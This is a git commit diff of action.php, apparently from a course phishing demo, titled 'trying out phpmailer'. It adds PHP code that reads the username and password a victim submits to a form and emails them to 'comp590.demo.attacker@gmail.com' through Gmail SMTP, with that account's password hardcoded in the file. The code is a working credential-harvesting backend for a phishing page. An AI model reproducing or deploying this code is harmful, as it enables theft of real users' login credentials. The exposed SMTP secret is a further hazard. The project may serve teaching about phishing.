62b925280a97639f017d58d795733cbcf795606d
Sarah Schmidt <sarah.schmidt344@myci.csuci.edu>
2020-04-19 03:57:22 -0700

    trying out phpmailer

--- action.php
+++ action.php
@@ -1,14 +1,49 @@
 <?php
 
+use PHPMailer\PHPMailer\PHPMailer;
+
+$email = "comp590.demo.attacker@gmail.com";
+
+//ini_set("SMTP","ssl://smtp.gmail.com");
+//ini_set("smtp_port","465");
+//ini_set('sendmail_from', $email);
+
+//ini_set("SMTP","smtp.gmail.com");
+//ini_set("smtp_port","587");
+//ini_set('sendmail_from', $email);
+
+//ini_set("SMTP","tls://smtp.gmail.com");
+//ini_set("smtp_port","587");
+//ini_set('sendmail_from', $email);
+
+$mail = new PHPMailer();
+$mail->isSMTP();
+$mail->Mailer = "smtp";
+$mail->SMTPDebug = 1;
+$mail->SMTPAuth = true;
+$mail->SMTPSecure = "tls";
+$mail->Port = 587;
+$mail->Host = "smtp.gmail.com";
+$mail->Username = $email;
+$mail->Password = "comp590344";
+
 echo "action page navigated";
-if ( isset( $_POST['submit'])) {
+if ( isset( $_REQUEST['submit'])) {
     echo "Form submitted";
-    $username = $_POST['name'];
-    $password = $_POST['pass'];
-
+    $username = $_REQUEST['name'];
+    $password = $_REQUEST['pass'];
+    
     $msg = "Username: $username \n Password: $password";
-    mail("comp590.demo.attacker@gmail.com", "User details", $msg);
 
-} else {
-    mail("comp590.demo.attacker@gmail.com", "Test email", "Testing.");
+    $mail->isHTML(true);
+    $mail->addAddress($email, $email);
+    $mail->setFrom($email, $email);
+    $mail->addReplyTo($email, $email);
+    $mail->Subject = "User details";
+    $mail->msgHTML($msg);
+    $mail->send();
+//    mail($email, "User details", $msg);
+
+//} else {
+//    mail($email, "Test email", "Testing.");
 }
